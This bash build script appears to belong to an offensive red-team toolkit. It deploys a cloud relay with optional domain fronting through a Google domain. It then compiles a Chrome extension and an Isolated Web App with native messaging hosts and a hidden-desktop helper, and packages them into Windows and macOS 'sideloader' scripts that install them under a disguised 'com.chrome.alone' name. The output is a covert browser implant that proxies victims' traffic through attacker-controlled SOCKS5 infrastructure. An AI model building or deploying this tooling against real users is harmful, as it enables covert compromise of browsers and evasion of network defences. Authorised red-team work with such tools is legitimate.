#!/bin/bash
set -e

# Parse command line arguments
DOMAIN_NAME=""
APP_NAME="com.chrome.alone"
OUTPUT_NAME="sideloader.ps1"
TFVARS_FILE=""
REGION=""  # Will be set based on provider if not specified
PROVIDER="aws"  # Default provider
GCP_PROJECT=""  # GCP project (required for GCP provider)
FRONT_DOMAIN="client2.google.com"  # Default front domain for domain fronting

# Function to display usage information
show_usage() {
  echo "Usage: $0 [--domain=example.com] [--appname=com.chrome.alone] [--output=sideloader.ps1] [--tfvars=path/to/terraform.tfvars] [--region=REGION] [--provider=aws|gcp] [--project=GCP_PROJECT] [--front-domain=DOMAIN]"
  echo ""
  echo "Arguments:"
  echo "  --domain=DOMAIN       Domain name for the relay server (required unless --tfvars is provided)"
  echo "  --appname=NAME        Custom app name (optional, default: com.chrome.alone)"
  echo "  --output=NAME         Output file name (optional, default: sideloader.ps1)"
  echo "  --tfvars=PATH         Path to existing terraform.tfvars file (skips terraform deployment)"
  echo "  --region=REGION       Region for deployment (optional, defaults: us-east-2 for AWS, us-central1 for GCP)"
  echo "  --provider=PROVIDER   Cloud provider (optional, default: aws, options: aws|gcp)"
  echo "  --project=PROJECT     GCP project ID (required when using --provider=gcp)"
  echo "  --front-domain=DOMAIN Domain to use for fronting (optional, default: client2.google.com for GCP, empty for AWS)"
  echo ""
}

# Parse arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --domain=*)
      DOMAIN_NAME="${1#*=}"
      shift
      ;;
    --appname=*)
      APP_NAME="${1#*=}"
      shift
      ;;
    --output=*)
      OUTPUT_NAME="${1#*=}"
      shift
      ;;
    --tfvars=*)
      TFVARS_FILE="${1#*=}"
      shift
      ;;
    --region=*)
      REGION="${1#*=}"
      shift
      ;;
    --provider=*)
      PROVIDER="${1#*=}"
      shift
      ;;
    --project=*)
      GCP_PROJECT="${1#*=}"
      shift
      ;;
    --front-domain=*)
      FRONT_DOMAIN="${1#*=}"
      shift
      ;;
    --help|-h)
      show_usage
      exit 0
      ;;
    *)
      # Unknown option
      echo "Unknown option: $1"
      show_usage
      exit 1
      ;;
  esac
done

# Check if domain is provided or tfvars file is specified
if [ -z "$DOMAIN_NAME" ] && [ -z "$TFVARS_FILE" ]; then
  echo "Error: Either domain name or tfvars file path is required"
  show_usage
  exit 1
fi

# If tfvars file is provided, validate it exists
if [ -n "$TFVARS_FILE" ] && [ ! -f "$TFVARS_FILE" ]; then
  echo "Error: TFVARs file not found: $TFVARS_FILE"
  exit 1
fi

# Set default region based on provider if not specified
if [ -z "$REGION" ]; then
  if [ "$PROVIDER" == "aws" ]; then
    REGION="us-east-2"
  elif [ "$PROVIDER" == "gcp" ]; then
    REGION="us-central1"
  fi
fi

# Validate provider
if [ "$PROVIDER" != "aws" ] && [ "$PROVIDER" != "gcp" ]; then
  echo "Error: Invalid provider '$PROVIDER'. Must be 'aws' or 'gcp'"
  show_usage
  exit 1
fi

# Validate GCP project is provided when using GCP
if [ "$PROVIDER" == "gcp" ] && [ -z "$GCP_PROJECT" ] && [ -z "$TFVARS_FILE" ]; then
  echo "Error: --project is required when using --provider=gcp"
  show_usage
  exit 1
fi

if [ -n "$TFVARS_FILE" ]; then
  echo "Using existing TFVARs file: $TFVARS_FILE"
else
  echo "Domain Name: $DOMAIN_NAME"
fi
echo "Provider: $PROVIDER"
echo "Region: $REGION"
if [ "$PROVIDER" == "gcp" ] && [ -n "$GCP_PROJECT" ]; then
  echo "GCP Project: $GCP_PROJECT"
fi
echo "App Name: ${APP_NAME:-Using default com.chrome.alone}"
echo "Output Name: ${OUTPUT_NAME:-Using default sideloader.ps1}"

# Function to check if a command exists
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Check for required dependencies
echo "Checking for required dependencies..."
MISSING_DEPS=0

# Always check these
for cmd in terraform npm node dotnet python3; do
  if ! command_exists $cmd; then
    echo "Error: $cmd is not installed or not in PATH"
    MISSING_DEPS=1
  fi
done

# Check provider-specific CLI
if [ "$PROVIDER" == "aws" ]; then
  if ! command_exists aws; then
    echo "Error: aws CLI is not installed or not in PATH (required for AWS provider)"
    MISSING_DEPS=1
  fi
elif [ "$PROVIDER" == "gcp" ]; then
  if ! command_exists gcloud; then
    echo "Error: gcloud CLI is not installed or not in PATH (required for GCP provider)"
    MISSING_DEPS=1
  fi
fi

if [ $MISSING_DEPS -eq 1 ]; then
  echo "Please install missing dependencies or use the Docker container"
  exit 1
fi

# Determine if we're in Docker or on local machine
if [ -d "/project" ] && [ "$(pwd)" = "/home/builder" ]; then
  # We're in Docker, change to the mounted project directory
  echo "Running in Docker container, changing to project directory..."
  cd /project
else
  # We're on a local machine, use current directory
  echo "Running on local machine, using current directory..."
fi

# Store the project root directory
PROJECT_ROOT=$(pwd)
echo "Project root: $PROJECT_ROOT"

# Step 0: Clone google-redirector if using GCP and it doesn't exist
if [ "$PROVIDER" == "gcp" ] && [ -z "$TFVARS_FILE" ]; then
  if [ ! -d "$PROJECT_ROOT/google-redirector" ]; then
    echo "Step 0: Cloning google-redirector repository (required for GCP deployments)"
    cd "$PROJECT_ROOT"
    git clone https://github.com/praetorian-inc/google-redirector.git
    echo "✓ google-redirector cloned successfully"
  else
    echo "Step 0: google-redirector directory already exists, skipping clone"
  fi
fi

# Step 1: Deploy relay (skip if tfvars file provided)
if [ -n "$TFVARS_FILE" ]; then
  echo "Step 1: Skipping terraform deployment (using provided TFVARs file)"
  # Copy the provided tfvars file to the expected location
  mkdir -p "$PROJECT_ROOT/output/relay-deployment"
  DEST_TFVARS="$PROJECT_ROOT/output/relay-deployment/terraform.tfvars"
  
  # Check if source and destination are the same file to avoid cp error
  if [ "$TFVARS_FILE" -ef "$DEST_TFVARS" ]; then
    echo "TFVARs file is already in the correct location"
  else
    cp "$TFVARS_FILE" "$DEST_TFVARS"
    echo "Copied TFVARs file to $DEST_TFVARS"
  fi
else
  echo "Step 1: Running deploy-relay.sh from BATTLEPLAN/ directory"
  cd "$PROJECT_ROOT/BATTLEPLAN"

  # Build the deploy command with appropriate flags
  DEPLOY_CMD="bash ./deploy-relay.sh --domain \"$DOMAIN_NAME\" --region \"$REGION\" --provider \"$PROVIDER\""
  if [ "$PROVIDER" == "gcp" ] && [ -n "$GCP_PROJECT" ]; then
    DEPLOY_CMD="$DEPLOY_CMD --project \"$GCP_PROJECT\""
  fi

  echo "Running: $DEPLOY_CMD"
  eval $DEPLOY_CMD
fi

# Extract domain_name and relay_token from terraform.tfvars
TFVARS_PATH="$PROJECT_ROOT/output/relay-deployment-${PROVIDER}/terraform.tfvars"
if [ ! -f "$TFVARS_PATH" ]; then
  echo "Error: terraform.tfvars file not found at $TFVARS_PATH"
  exit 1
fi

# Extract values based on provider
echo "Extracting configuration from terraform outputs..."
cd "$PROJECT_ROOT/output/relay-deployment-${PROVIDER}"

EXTRACTED_TOKEN=$(grep 'relay_token' terraform.tfvars | sed 's/relay_token = "\(.*\)"/\1/')

if [ -z "$EXTRACTED_TOKEN" ]; then
  echo "Error: Could not extract relay_token from terraform.tfvars"
  exit 1
fi

echo "Extracted token: ${EXTRACTED_TOKEN:0:8}..." # Only show first 8 chars for security

# Set WS_DOMAIN, FRONT_DOMAIN, and TARGET_HOST based on provider
if [ "$PROVIDER" == "gcp" ]; then
  # For GCP, get the redirector URL from terraform output
  REDIRECTOR_URL=$(terraform output -raw redirector_url 2>/dev/null)

  if [ -z "$REDIRECTOR_URL" ]; then
    echo "Error: Could not extract redirector_url from terraform output"
    exit 1
  fi

  # Extract hostname from redirector URL (remove https:// and port)
  WS_DOMAIN=$(echo "$REDIRECTOR_URL" | sed 's|https://||' | sed 's|:443$||')
  # TARGET_HOST is the redirector hostname
  TARGET_HOST="$WS_DOMAIN"
  # FRONT_DOMAIN was provided by user (or default client2.google.com)

  echo "Redirector URL: $REDIRECTOR_URL"
  echo "WS_DOMAIN: $WS_DOMAIN"
  echo "FRONT_DOMAIN: $FRONT_DOMAIN"
  echo "TARGET_HOST: $TARGET_HOST"

elif [ "$PROVIDER" == "aws" ]; then
  # For AWS, get domain from terraform.tfvars
  EXTRACTED_DOMAIN=$(grep 'domain_name' terraform.tfvars | sed 's/domain_name = "\(.*\)"/\1/')

  if [ -z "$EXTRACTED_DOMAIN" ]; then
    echo "Error: Could not extract domain_name from terraform.tfvars"
    exit 1
  fi

  WS_DOMAIN="$EXTRACTED_DOMAIN"
  TARGET_HOST="$EXTRACTED_DOMAIN"
  FRONT_DOMAIN=""  # No domain fronting for AWS

  echo "Domain: $EXTRACTED_DOMAIN"
  echo "WS_DOMAIN: $WS_DOMAIN"
  echo "TARGET_HOST: $TARGET_HOST"
fi

# Create .env file for webpack
ENV_FILE="$PROJECT_ROOT/BLOWTORCH/.env"
echo "Creating .env file for webpack at $ENV_FILE"
cat > "$ENV_FILE" << EOF
WS_DOMAIN=$WS_DOMAIN
RELAY_TOKEN=$EXTRACTED_TOKEN
FRONT_DOMAIN=$FRONT_DOMAIN
TARGET_HOST=$TARGET_HOST
EOF

# Step 2: Install npm dependencies
echo "Step 2: Running npm install"
cd "$PROJECT_ROOT/BLOWTORCH"
npm install

# Step 2a: Generate IWA signing keys
if [ ! -f "cert.pem" ] || [ ! -f "private.key" ]; then
  echo "Generating IWA signing keys..."
  npm run generate-keys
fi

# Step 3: Build the IWA extension in Prod mode
echo "Step 3: Running npm run build:prod"
# The .env file will be used by webpack.config.cjs
npm run build:prod

# Step 3a move signed web bundle to the output folder
mkdir -p "$PROJECT_ROOT/output/iwa"
mv "$PROJECT_ROOT/BLOWTORCH/dist/app.swbn" "$PROJECT_ROOT/output/iwa/app.swbn"
rm -rf "$PROJECT_ROOT/BLOWTORCH/dist"
rm $ENV_FILE

# Step 4: Build the extension
echo "Step 4: Building the extension"
cd "$PROJECT_ROOT"

# Step 4a: Copy the extension files
cp -r ./HOTWHEELS/extension/ ./output/extension/
cp ./PAINTBUCKET/ContentScriptInject/*.js ./output/extension/

# Step 4b: Build the WASM files
GOOS=js GOARCH=wasm go build -buildvcs=false -trimpath -ldflags "-s -w" -o ./output/extension/wasm/main.wasm ./HOTWHEELS/wasm/content-script/
GOOS=js GOARCH=wasm go build -buildvcs=false -trimpath -ldflags "-s -w -X main.EXTENSION_NAME=$APP_NAME" -o output/extension/wasm/background.wasm ./HOTWHEELS/wasm/background-script/

# Step 4c: build the native messaging hosts
dotnet build -c Release -r win-x64 -o output/extension/ ./DOORKNOB/ExtensionSideloader/dotnet/NativeAppHost/NativeAppHost.csproj
cp ./DOORKNOB/ExtensionSideloader/macos/NativeAppHost.sh ./output/extension/NativeAppHost.sh

# Step 4d: Build our support dotnet libraries
cd "$PROJECT_ROOT/DOORKNOB/IWASideloader/RegHelper"
dotnet build -c Release -r win-x64 .
cd "$PROJECT_ROOT/DOORKNOB/IWASideloader/HiddenDesktopNative"
dotnet build -c Release -r win-x64 .

# Step 5: Create sideloaders
echo "Step 5: Creating sideloaders"

# Step 5a: Create IWA Sideloaders
cd "$PROJECT_ROOT"

echo "Using APP_NAME: $APP_NAME"

python3 ./DOORKNOB/IWASideloader/createSideloader.py ./output/iwa/app.swbn --appname="$APP_NAME" --output=./output/iwa-sideloader.sh --platform macos
python3 ./DOORKNOB/IWASideloader/createSideloader.py ./output/iwa/app.swbn --appname="$APP_NAME" --output=./output/iwa-sideloader.ps1

# Step 5b: Create Chrome Sideloaders
python3 ./DOORKNOB/ExtensionSideloader/build_sideloader.py ./output/extension "\$HOME/Library/Application Support/Google/$APP_NAME" --output=./output/extension-sideloader.sh --os macos
python3 ./DOORKNOB/ExtensionSideloader/build_sideloader.py ./output/extension "%LOCALAPPDATA%\Google\\$APP_NAME" --output=./output/extension-sideloader.ps1 --os windows

# Step 5c: Create combined sideloader script:
echo "Creating combined sideloader script..."

# Determine the actual APP_NAME being used (same logic as the individual sideloaders)
ACTUAL_APP_NAME="${APP_NAME:-com.chrome.alone}"
echo "Using APP_NAME: $ACTUAL_APP_NAME for combined sideloader"

# Create the combined script header with unified parameters
cat > ./output/sideloader.ps1 << EOF
# Combined Chrome Extension and IWA Sideloader Script
# This script can install Chrome Extension, IWA, or both

param(
    [string]\$Mode = "both",  # "extension", "iwa", or "both"
    [string]\$APP_NAME = "$ACTUAL_APP_NAME",
    [string]\$ExtensionInstallDir = "%LOCALAPPDATA%\Google\\$ACTUAL_APP_NAME",
    [string]\$ExtensionDescription = "Chrome Extension",
    [string]\$InstallNativeMessagingHost = "false",
    [string]\$ForceRestartChrome = "false"
)

Write-Host "Combined Chrome Extension and IWA Sideloader" -ForegroundColor Cyan
Write-Host "Mode: \$Mode" -ForegroundColor Yellow
Write-Host "APP_NAME: '\$APP_NAME'" -ForegroundColor Yellow
Write-Host "APP_NAME Length: \$(\$APP_NAME.Length)" -ForegroundColor Yellow

EOF

# Add extension sideloader functions (remove param block and execution logic)
echo "# === EXTENSION SIDELOADER FUNCTIONS ===" >> ./output/sideloader.ps1
sed '/^param(/,/^)$/d; /^# Run the main function only/,$d' ./output/extension-sideloader.ps1 >> ./output/sideloader.ps1

# Add IWA sideloader content (wrap in function)
echo "" >> ./output/sideloader.ps1
echo "# === IWA SIDELOADER FUNCTIONS ===" >> ./output/sideloader.ps1
echo "function Install-IWA {" >> ./output/sideloader.ps1

# Set APP_NAME locally within the function
echo '    $env:APP_NAME = $APP_NAME' >> ./output/sideloader.ps1
echo "" >> ./output/sideloader.ps1

# Extract the IWA installation logic (after the bundleData definition, skip original APP_NAME line)
sed -n '/^\$bundleData = @"/,/^"@$/p' ./output/iwa-sideloader.ps1 >> ./output/sideloader.ps1
sed -n '/^"@$/,$p' ./output/iwa-sideloader.ps1 | tail -n +2 | sed '/^\$env:APP_NAME/d' >> ./output/sideloader.ps1

echo "}" >> ./output/sideloader.ps1

# Add main execution logic
cat >> ./output/sideloader.ps1 << 'EOF'

# === MAIN EXECUTION LOGIC ===
try {
    # Resolve the ExtensionInstallDir with APP_NAME substitution
    $ExtensionInstallDir = $ExtensionInstallDir -replace '\$APP_NAME', $APP_NAME
    
    if ($Mode -eq "extension" -or $Mode -eq "both") {
        Write-Host "`nInstalling Chrome Extension..." -ForegroundColor Green
        Write-Host "Extension install directory: $ExtensionInstallDir" -ForegroundColor Yellow
        Main  # Call the extension installation function
    }

    if ($Mode -eq "iwa" -or $Mode -eq "both") {
        Write-Host "`nInstalling IWA..." -ForegroundColor Green
        Install-IWA  # Call the IWA installation function
    }

    Write-Host "`nInstallation completed successfully!" -ForegroundColor Green
} catch {
    Write-Error "Installation failed: $($_.Exception.Message)"
    exit 1
}
EOF

echo "Combined sideloader script created successfully"

# Step 5d: Create combined macOS sideloader script
echo "Creating combined macOS sideloader script..."

# Create the combined macOS script header with unified parameters
cat > ./output/sideloader-mac.sh << 'EOF'
#!/bin/bash

# Combined Chrome Extension and IWA Sideloader Script for macOS
# This script can install Chrome Extension, IWA, or both

# Default parameters
MODE="both"  # "extension", "iwa", or "both"
APP_NAME="ACTUAL_APP_NAME_PLACEHOLDER"
EXTENSION_INSTALL_DIR="$HOME/Library/Application Support/Google/ACTUAL_APP_NAME_PLACEHOLDER"
EXTENSION_DESCRIPTION="Chrome Extension"
INSTALL_NATIVE_MESSAGING_HOST="true"
FORCE_RESTART_CHROME="true"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --mode)
            MODE="$2"
            shift 2
            ;;
        --app-name)
            APP_NAME="$2"
            shift 2
            ;;
        --extension-dir)
            EXTENSION_INSTALL_DIR="$2"
            shift 2
            ;;
        --description)
            EXTENSION_DESCRIPTION="$2"
            shift 2
            ;;
        --install-native-host)
            INSTALL_NATIVE_MESSAGING_HOST="$2"
            shift 2
            ;;
        --force-restart)
            FORCE_RESTART_CHROME="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: $0 [--mode extension|iwa|both] [--app-name NAME] [--extension-dir DIR] [--description DESC] [--install-native-host true|false] [--force-restart true|false]"
            exit 1
            ;;
    esac
done

echo "Combined Chrome Extension and IWA Sideloader for macOS"
echo "Mode: $MODE"
echo "APP_NAME: '$APP_NAME'"

EOF

# Replace the placeholder with actual APP_NAME
sed -i.tmp "s/ACTUAL_APP_NAME_PLACEHOLDER/$ACTUAL_APP_NAME/g" ./output/sideloader-mac.sh
rm -f ./output/sideloader-mac.sh.tmp

# Add extension sideloader functions (remove argument parsing and execution logic)
echo "" >> ./output/sideloader-mac.sh
echo "# === EXTENSION SIDELOADER FUNCTIONS ===" >> ./output/sideloader-mac.sh

# Extract extension functions, removing the argument parsing, parameter definitions, and main execution
sed '/^# Parse command line arguments/,/^done$/d; /^# Default parameters/,/^$/d; /^# Run main function only/,$d' ./output/extension-sideloader.sh >> ./output/sideloader-mac.sh

# Add IWA sideloader content (wrap in function)
echo "" >> ./output/sideloader-mac.sh
echo "# === IWA SIDELOADER FUNCTIONS ===" >> ./output/sideloader-mac.sh
echo "install_iwa() {" >> ./output/sideloader-mac.sh

# Extract the IWA installation logic (skip the shebang and initial comments, but keep everything else including the APP_NAME export)
# We need to handle HERE documents specially - they can't be indented
sed '1,/^set -e$/d' ./output/iwa-sideloader.sh | while IFS= read -r line; do
    # Don't indent HERE document delimiters (lines that are just EOF, STARTEOF, PLISTEOF, etc.)
    if [[ "$line" =~ ^[A-Z]*EOF$ ]] || [[ "$line" =~ ^\'[A-Z]*EOF\'$ ]]; then
        echo "$line"
    else
        echo "    $line"
    fi
done >> ./output/sideloader-mac.sh

echo "}" >> ./output/sideloader-mac.sh

# Add main execution logic
cat >> ./output/sideloader-mac.sh << 'EOF'

# === MAIN EXECUTION LOGIC ===

# Resolve the ExtensionInstallDir with APP_NAME substitution
EXTENSION_INSTALL_DIR=$(echo "$EXTENSION_INSTALL_DIR" | sed "s/ACTUAL_APP_NAME_PLACEHOLDER/$APP_NAME/g")

if [[ "$MODE" == "extension" || "$MODE" == "both" ]]; then
    echo ""
    echo "Installing Chrome Extension..."
    echo "Extension install directory: $EXTENSION_INSTALL_DIR"
    
    # Call the extension installation function
    main
fi

if [[ "$MODE" == "iwa" || "$MODE" == "both" ]]; then
    echo ""
    echo "Installing IWA..."
    
    # Call the IWA installation function
    install_iwa
fi

echo ""
echo "Installation completed successfully!"
EOF

# Make the script executable
chmod +x ./output/sideloader-mac.sh

echo "Combined macOS sideloader script created successfully"

# Step 6: Configure Relay Agent Webapp:
echo "Step 6: Configuring Relay Agent Webapp"

# Step 6a: Copy client files to output directory
echo "Step 6a: Copying client files to output/client/"
mkdir -p "$PROJECT_ROOT/output/client"
cp -r "$PROJECT_ROOT/BATTLEPLAN/client/"* "$PROJECT_ROOT/output/client/"

# Step 6b: Extract configuration and update config.js
echo "Step 6b: Updating config.js with relay configuration"

# Extract values from TFVARs file format
RELAY_HOST=$(grep 'domain_name' "$TFVARS_PATH" | sed 's/domain_name = "\(.*\)"/\1/')
RELAY_PORT="1080"  # Default SOCKS5 port
RELAY_USERNAME=$(grep 'proxy_user' "$TFVARS_PATH" | sed 's/proxy_user = "\(.*\)"/\1/')
RELAY_PASSWORD=$(grep 'proxy_pass' "$TFVARS_PATH" | sed 's/proxy_pass = "\(.*\)"/\1/')

# Validate extracted values
if [ -z "$RELAY_HOST" ] || [ -z "$RELAY_PORT" ] || [ -z "$RELAY_USERNAME" ] || [ -z "$RELAY_PASSWORD" ]; then
  echo "Error: Could not extract all required values from terraform.tfvars"
  echo "Host: $RELAY_HOST, Port: $RELAY_PORT, Username: $RELAY_USERNAME"
  echo "Make sure the tfvars file contains: domain_name, proxy_user, and proxy_pass"
  exit 1
fi

echo "Updating config.js with extracted values:"
echo "  Host: $RELAY_HOST"
echo "  Port: $RELAY_PORT"
echo "  Username: $RELAY_USERNAME"
echo "  Password: ${RELAY_PASSWORD:0:8}..." # Only show first 8 chars for security

# Update config.js with extracted values
CONFIG_JS_FILE="$PROJECT_ROOT/output/client/config.js"
# Escape special characters in the values for sed
RELAY_HOST_ESCAPED=$(printf '%s\n' "$RELAY_HOST" | sed 's/[[\.*^$()+?{|]/\\&/g')
RELAY_PORT_ESCAPED=$(printf '%s\n' "$RELAY_PORT" | sed 's/[[\.*^$()+?{|]/\\&/g')
RELAY_USERNAME_ESCAPED=$(printf '%s\n' "$RELAY_USERNAME" | sed 's/[[\.*^$()+?{|]/\\&/g')
RELAY_PASSWORD_ESCAPED=$(printf '%s\n' "$RELAY_PASSWORD" | sed 's/[[\.*^$()+?{|]/\\&/g')

sed -i.backup \
  -e "s|defaultHost: \"[^\"]*\"|defaultHost: \"$RELAY_HOST_ESCAPED\"|" \
  -e "s|defaultPort: \"[^\"]*\"|defaultPort: \"$RELAY_PORT_ESCAPED\"|" \
  -e "s|defaultUsername: \"[^\"]*\"|defaultUsername: \"$RELAY_USERNAME_ESCAPED\"|" \
  -e "s|defaultPassword: \"[^\"]*\"|defaultPassword: \"$RELAY_PASSWORD_ESCAPED\"|" \
  "$CONFIG_JS_FILE"

# Remove backup file
rm -f "$CONFIG_JS_FILE.backup"

echo "Step 6: Client configuration completed successfully"

echo "Build completed successfully! Interact with your extension relay by opening output/client/index.html"